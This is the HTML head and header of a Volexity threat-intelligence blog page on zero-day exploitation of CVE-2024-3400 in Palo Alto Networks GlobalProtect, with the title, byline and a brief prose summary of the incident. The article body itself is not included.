<!DOCTYPE html>
<!--[if lt IE 7 ]> <html lang="en-US" class="ie ie6 lte9 lte8 lte7 lte6 no-js"> <![endif]-->
<!--[if IE 7 ]>    <html lang="en-US" class="ie ie7 lte9 lte8 lte7 no-js"> <![endif]-->
<!--[if IE 8 ]>    <html lang="en-US" class="ie ie8 lte9 lte8 no-js"> <![endif]-->
<!--[if IE 9 ]>    <html lang="en-US" class="ie ie9 lte9 no-js"> <![endif]-->
<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en-US" class="no-js"> <!--<![endif]-->
<meta charset="UTF-8">
<title>Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400) | Volexity</title>
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="cleartype" content="on">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@Volexity">
<meta name="twitter:creator" content="@Volexity">

<meta name="twitter:title" content="Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)">

<meta name="twitter:description" content="Volexity would like to thank Palo Alto Networks for their partnership, cooperation, and rapid response to this critical issue. Their research can be found here. On April 10, 2024, Volexity identified zero-day exploitation of a vulnerability found within the GlobalProtect feature of Palo Alto Networks PAN-OS at one of its network security monitoring (NSM) customers. Volexity received alerts regarding suspect network traffic emanating from the customer’s firewall. A subsequent investigation determined the device had been compromised. The following day, April 11, 2024, Volexity observed further, identical exploitation at another one of its NSM customers by the same threat actor. The threat actor, which Volexity tracks under the alias UTA0218, was able to remotely exploit the firewall device, create a reverse shell, and download further tools onto the device. The attacker focused on exporting configuration data from the devices, and then leveraging it as an entry point to move laterally within [&hellip;]">

	<meta name="twitter:image" content="https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400.png">
	
<link rel="apple-touch-icon" sizes="180x180" href="https://www.volexity.com/wp-content/themes/volexity/apple-touch-icon.png">
<link rel="icon" type="image/png" href="https://www.volexity.com/wp-content/themes/volexity/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://www.volexity.com/wp-content/themes/volexity/favicon-16x16.png" sizes="16x16">
<link rel="icon" type="image/png" href="https://www.volexity.com/wp-content/themes/volexity/favicon.ico">
<link rel="manifest" href="https://www.volexity.com/wp-content/themes/volexity/manifest.json">
<meta name="theme-color" content="#12BEF0">

<meta property="og:image" content="https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400-300x157.png" />

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-WRSX85NK29"></script>
<script>
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-WRSX85NK29');
</script>

	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

	<!-- This site is optimized with the Yoast SEO Premium plugin v22.5 (Yoast SEO v23.8) - https://yoast.com/wordpress/plugins/seo/ -->
	<meta name="description" content="On April 10, 2024, Volexity identified zero-day exploitation of a vulnerability found within the GlobalProtect feature of Palo Alto Networks PAN-OS at one of its network security monitoring (NSM) customers. Volexity received alerts regarding suspect network traffic emanating from the customer’s firewall. A subsequent investigation determined the device had been compromised. The following day, April 11, 2024, Volexity observed further, identical exploitation at another one of its NSM customers by the same threat actor." />
	<link rel="canonical" href="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)" />
	<meta property="og:description" content="On April 10, 2024, Volexity identified zero-day exploitation of a vulnerability found within the GlobalProtect feature of Palo Alto Networks PAN-OS at one of its network security monitoring (NSM) customers. Volexity received alerts regarding suspect network traffic emanating from the customer’s firewall. A subsequent investigation determined the device had been compromised. The following day, April 11, 2024, Volexity observed further, identical exploitation at another one of its NSM customers by the same threat actor." />
	<meta property="og:url" content="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/" />
	<meta property="og:site_name" content="Volexity" />
	<meta property="article:publisher" content="https://www.facebook.com/volexity/" />
	<meta property="article:published_time" content="2024-04-12T17:02:59+00:00" />
	<meta property="article:modified_time" content="2024-11-21T16:40:57+00:00" />
	<meta property="og:image" content="https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400.png" />
	<meta property="og:image:width" content="2060" />
	<meta property="og:image:height" content="1076" />
	<meta property="og:image:type" content="image/png" />
	<meta name="author" content="Volexity" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/#article","isPartOf":{"@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"},"author":{"name":"Volexity","@id":"https://www.volexity.com/#/schema/person/3159370c7fbbe719c11e41aeb6353ae1"},"headline":"Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)","datePublished":"2024-04-12T17:02:59+00:00","dateModified":"2024-11-21T16:40:57+00:00","mainEntityOfPage":{"@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"},"wordCount":3587,"publisher":{"@id":"https://www.volexity.com/#organization"},"image":{"@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/#primaryimage"},"thumbnailUrl":"https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400.png","keywords":["0day","APT","Exploit","firewall","Global Protect","Palo Alto Networks","RCE","zero-day"],"articleSection":["Threat Intelligence"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/","url":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/","name":"Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400) | Volexity","isPartOf":{"@id":"https://www.volexity.com/#website"},"primaryImageOfPage":{"@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/#primaryimage"},"image":{"@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/#primaryimage"},"thumbnailUrl":"https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400.png","datePublished":"2024-04-12T17:02:59+00:00","dateModified":"2024-11-21T16:40:57+00:00","description":"On April 10, 2024, Volexity identified zero-day exploitation of a vulnerability found within the GlobalProtect feature of Palo Alto Networks PAN-OS at one of its network security monitoring (NSM) customers. Volexity received alerts regarding suspect network traffic emanating from the customer’s firewall. A subsequent investigation determined the device had been compromised. The following day, April 11, 2024, Volexity observed further, identical exploitation at another one of its NSM customers by the same threat actor.","breadcrumb":{"@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/#primaryimage","url":"https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400.png","contentUrl":"https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400.png","width":2060,"height":1076,"caption":"Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400"},{"@type":"BreadcrumbList","@id":"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://www.volexity.com/"},{"@type":"ListItem","position":2,"name":"Blog","item":"https://www.volexity.com/blog/"},{"@type":"ListItem","position":3,"name":"Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)"}]},{"@type":"WebSite","@id":"https://www.volexity.com/#website","url":"https://www.volexity.com/","name":"Volexity | Memory Forensics, Cybersecurity Threat Intelligence & Incident Response","description":"","publisher":{"@id":"https://www.volexity.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.volexity.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://www.volexity.com/#organization","name":"Volexity Inc.","alternateName":"Volexity - Forensic Memory Analysis","url":"https://www.volexity.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.volexity.com/#/schema/logo/image/","url":"https://www.volexity.com/wp-content/uploads/2018/01/Volexity-Logo-Full-Stacked-2019-1000px.jpg","contentUrl":"https://www.volexity.com/wp-content/uploads/2018/01/Volexity-Logo-Full-Stacked-2019-1000px.jpg","width":1000,"height":1000,"caption":"Volexity Inc."},"image":{"@id":"https://www.volexity.com/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/volexity/","https://x.com/Volexity","https://www.linkedin.com/company/volexity/","https://github.com/volexity","https://infosec.exchange/@volexity"]},{"@type":"Person","@id":"https://www.volexity.com/#/schema/person/3159370c7fbbe719c11e41aeb6353ae1","name":"Volexity","image":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.volexity.com/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/757082c7e4105ce43a92a48f14f581c2?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/757082c7e4105ce43a92a48f14f581c2?s=96&d=mm&r=g","caption":"Volexity"}}]}</script>
	<!-- / Yoast SEO Premium plugin. -->


<link rel='stylesheet' id='wp-block-library-css' href='https://www.volexity.com/wp-includes/css/dist/block-library/style.min.css?ver=6.7' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='cookie-notice-front-css' href='https://www.volexity.com/wp-content/plugins/cookie-notice/css/front.min.css?ver=2.4.18' type='text/css' media='all' />
<link rel='stylesheet' id='main-style-css' href='https://www.volexity.com/wp-content/themes/volexity/dist/styles/styles.min.css?ver=6.7' type='text/css' media='screen, print' />
<script type="text/javascript" id="cookie-notice-front-js-before">
/* <![CDATA[ */
var cnArgs = {"ajaxUrl":"https:\/\/www.volexity.com\/wp-admin\/admin-ajax.php","nonce":"a737529f8f","hideEffect":"fade","position":"bottom","onScroll":false,"onScrollOffset":100,"onClick":false,"cookieName":"cookie_notice_accepted","cookieTime":2592000,"cookieTimeRejected":2592000,"globalCookie":false,"redirection":false,"cache":false,"revokeCookies":false,"revokeCookiesOpt":"automatic"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.volexity.com/wp-content/plugins/cookie-notice/js/front.min.js?ver=2.4.18" id="cookie-notice-front-js"></script>
<script type="text/javascript" src="https://www.volexity.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://www.volexity.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://www.volexity.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.volexity.com/wp-json/wp/v2/posts/3176" /><link rel='shortlink' href='https://www.volexity.com/?p=3176' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.volexity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.volexity.com%2Fblog%2F2024%2F04%2F12%2Fzero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.volexity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.volexity.com%2Fblog%2F2024%2F04%2F12%2Fzero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400%2F&#038;format=xml" />
		<style type="text/css" id="wp-custom-css">
			/*
You can add your own CSS here.

Click the help icon above to learn more.
*/		</style>
		
	<!--[if lte IE 9 ]>
		<script src="https://www.volexity.com/wp-content/themes/volexity/scripts/vendor/selectivizr.js"></script>
		<script src="https://www.volexity.com/wp-content/themes/volexity/scripts/vendor/respond.js"></script>
		<script src="https://www.volexity.com/wp-content/themes/volexity/scripts/vendor/mediamatch.js"></script>
	<![endif]-->
</head>
<body class="post-template-default single single-post postid-3176 single-format-standard cookies-not-set chrome windows">
	<header class="header">
    <div class="header-top-container">
        <div class="container">
            <ul id="menu-sub-left" class="header-sub-left"><li id="menu-item-2116" class="icon-triangle menu-item menu-item-type-post_type menu-item-object-page menu-item-2116"><a href="https://www.volexity.com/company/contact/demo-request/" class="icon-triangle">Request A Demo</a></li>
</ul>            <ul id="menu-sub-right" class="header-sub-right"><li id="menu-item-1213" class="icon-warning menu-item menu-item-type-post_type menu-item-object-page menu-item-1213"><a href="https://www.volexity.com/company/contact/breach-assistance/" class="icon-warning">Breach Assistance</a></li>
</ul>        </div>
    </div>
	<div class="header-container">
        <div class="container">
            <a class="header-logo" href="https://www.volexity.com"><img src="https://www.volexity.com/wp-content/themes/volexity/dist/images/logo.png" alt="Volexity"></a>
            <div class="header-menu">
                <ul id="menu-main-navigation" class="header-menu-list"><li id="menu-item-376" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-376"><a href="https://www.volexity.com/products-overview/">Products</a>
<ul class="sub-menu">
	<li id="menu-item-48" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-48"><a href="https://www.volexity.com/products-overview/">Products Overview</a></li>
	<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.volexity.com/products-overview/volcano/">Volcano</a></li>
	<li id="menu-item-49" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-49"><a href="https://www.volexity.com/products-overview/surge/">Surge</a></li>
</ul>
</li>
<li id="menu-item-377" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-377"><a href="https://www.volexity.com/services-overview/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-55" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-55"><a href="https://www.volexity.com/services-overview/">Services Overview</a></li>
	<li id="menu-item-52" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-52"><a href="https://www.volexity.com/services-overview/incident-response/">Incident Response</a></li>
	<li id="menu-item-53" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-53"><a href="https://www.volexity.com/services-overview/network-security-monitoring/">Network Security Monitoring</a></li>
	<li id="menu-item-54" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-54"><a href="https://www.volexity.com/services-overview/proactive-threat-assessments/">Proactive Threat Assessments</a></li>
	<li id="menu-item-56" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-56"><a href="https://www.volexity.com/services-overview/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-2394" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2394"><a href="https://www.volexity.com/services-overview/mergers-acquisitions-cybersecurity-assessments/">M&#038;A Cybersecurity Assessments</a></li>
</ul>
</li>
<li id="menu-item-385" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-385"><a href="https://www.volexity.com/company/about/">Company</a>
<ul class="sub-menu">
	<li id="menu-item-41" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-41"><a href="https://www.volexity.com/company/about/">About</a></li>
	<li id="menu-item-43" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43"><a href="https://www.volexity.com/company/news-press/">News &#038; Press</a></li>
	<li id="menu-item-1849" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1849"><a href="https://www.volexity.com/company/careers/">Careers</a></li>
	<li id="menu-item-1824" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1824"><a href="https://www.volexity.com/company/internships/">Internships</a></li>
	<li id="menu-item-1718" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1718"><a href="https://www.volexity.com/company/resources/">Resources</a></li>
</ul>
</li>
<li id="menu-item-39" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-39"><a href="https://www.volexity.com/blog/">Blog</a></li>
<li id="menu-item-45" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-45"><a href="https://www.volexity.com/company/contact/">Contact</a></li>
</ul>            </div>
            <div class="mobile-menu--holder">
                <div class="mobile-menu"></div>
            </div>
        </div>
	</div>
</header>
<div class="int-header s5">
    <div class="container">
        <section class="int-header-hold col-sm-12">
            blog        </section>
    </div>
</div>
	<main class="main">
		<div class="container">
	<section class="row int">
		<article class="col-sm-8">
			<div class="post-content composition">
				<h2 class="post-title">Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)</h2>
				<p class="post-date">April 12, 2024</p>
									<p class="post-byline">by Volexity Threat Research</p>
					
				<div class="post-single-social">
		      <a class="post-single-social-share" data-share-channel="facebook" data-title="Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)" data-description="Volexity would like to thank Palo Alto Networks for their partnership, cooperation, and rapid response to this critical issue. Their research can be found here. On April 10, 2024, Volexity identified zero-day exploitation of a vulnerability found within the GlobalProtect feature of Palo Alto Networks PAN-OS at one of its network security monitoring (NSM) customers. Volexity received alerts regarding suspect network traffic emanating from the customer’s firewall. A subsequent investigation determined the device had been compromised. The following day, April 11, 2024, Volexity observed further, identical exploitation at another one of its NSM customers by the same threat actor. The threat actor, which Volexity tracks under the alias UTA0218, was able to remotely exploit the firewall device, create a reverse shell, and download further tools onto the device. The attacker focused on exporting configuration data from the devices, and then leveraging it as an entry point to move laterally within [&hellip;]" data-url="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/" data-image="" data-caption="Volexity"><i class="icon icon-facebook-share"></i><span class="sr-only">Facebook</span></a>
		      <a class="post-single-social-share" data-share-channel="twitter" data-text="Zero-Day+Exploitation+of+Unauthenticated+Remote+Code+Execution+Vulnerability+in+GlobalProtect+%28CVE-2024-3400%29" data-url="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/" data-hashtags="volexity" data-via="Volexity"><i class="icon icon-twitter-share"></i><span class="sr-only">Twitter</span></a>
		      <a class="post-single-social-share" data-share-channel="email" data-post-id="3176"><i class="icon icon-mail-share"></i><span class="sr-only">Email</span></a>
			  </div>
